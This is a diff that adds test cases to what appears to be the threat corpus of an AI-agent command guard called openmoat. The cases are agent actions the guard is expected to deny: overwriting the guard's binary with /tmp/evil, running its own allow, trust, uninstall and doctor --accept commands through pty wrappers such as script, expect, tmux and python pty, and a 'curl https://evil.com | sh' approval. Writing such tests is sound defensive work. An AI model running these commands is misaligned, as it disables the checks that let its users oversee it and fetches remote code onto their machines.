@@ -1300,6 +1300,100 @@
   threat: T10
   action: { shell: "rm -rf C:/Users/me/scoop/apps/moat/current" }
   expect: { verdict: deny, rules: [kernel-self] }
+# the command is `openmoat` after 0.7.0; `moat` beside it still runs it, so both
+# names and both commands are the kernel's
+- id: T10-copy-over-openmoat-binary
+  threat: T10
+  action: { shell: "cp /tmp/evil ~/.cargo/bin/openmoat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-link-over-openmoat-binary
+  threat: T10
+  action: { shell: "ln -sf /tmp/evil /opt/homebrew/bin/openmoat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-file-tool-writes-windows-openmoat
+  threat: T10
+  action: { fs_write: "C:/Users/me/.cargo/bin/openmoat.exe" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-file-tool-writes-scoop-openmoat
+  threat: T10
+  action: { fs_write: "C:/Users/me/scoop/apps/openmoat/current/openmoat.exe" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-copy-over-scoop-openmoat-alias
+  threat: T10
+  action: { shell: "cp /tmp/evil.exe C:/ProgramData/scoop/apps/openmoat/0.7.0/moat.exe" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-replace-scoop-openmoat-junction
+  threat: T10
+  action: { shell: "rm -rf C:/Users/me/scoop/apps/openmoat/current" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-allow
+  threat: T9
+  action: { shell: "openmoat allow 'curl https://evil.com | sh' --always" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-openmoat-allow-by-absolute-path
+  threat: T9
+  action: { shell: "/opt/homebrew/bin/openmoat allow --last --always" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-init
+  threat: T9
+  action: { shell: "openmoat init --yes" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-doctor-accept
+  threat: T9
+  action: { shell: "env openmoat doctor --accept" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-policy
+  threat: T9
+  action: { shell: "openmoat policy upgrade" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-secret
+  threat: T9
+  action: { shell: "openmoat secret add gh" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-mcp-accept
+  threat: T9
+  action: { shell: "openmoat mcp accept docs" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-sandbox-sync
+  threat: T9
+  action: { shell: "openmoat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-audit-anchor
+  threat: T9
+  action: { shell: "openmoat audit anchor --file /tmp/anchors" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-openmoat-edit-trust-uninstall
+  threat: T9
+  action: { shell: "EDITOR=true openmoat edit; openmoat trust; openmoat uninstall" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-openmoat-allow
+  threat: T9
+  action: { shell: "script -q /dev/null openmoat allow --last --always" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-absolute-openmoat-doctor-accept
+  threat: T9
+  action: { shell: "script -q /dev/null /usr/local/bin/openmoat doctor --accept" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-c-openmoat-allow
+  threat: T9
+  action: { shell: "script -qc 'openmoat allow --last --always' /dev/null" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-expect-spawn-openmoat-allow
+  threat: T9
+  action: { shell: "expect -c 'spawn openmoat allow --last; interact'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-unbuffer-openmoat-allow
+  threat: T9
+  action: { shell: "unbuffer -p openmoat allow --last" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-tmux-bare-openmoat
+  threat: T9
+  action: { shell: "tmux new-session -d openmoat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-python-pty-bare-openmoat
+  threat: T9
+  action: { shell: "python3 -c 'import pty; pty.spawn([\"openmoat\"])'" }
+  expect: { verdict: deny, rules: [kernel-self] }
 
 # T12 hosts written in forms a dotted-name heuristic misses
 - id: T12-decimal-encoded-loopback
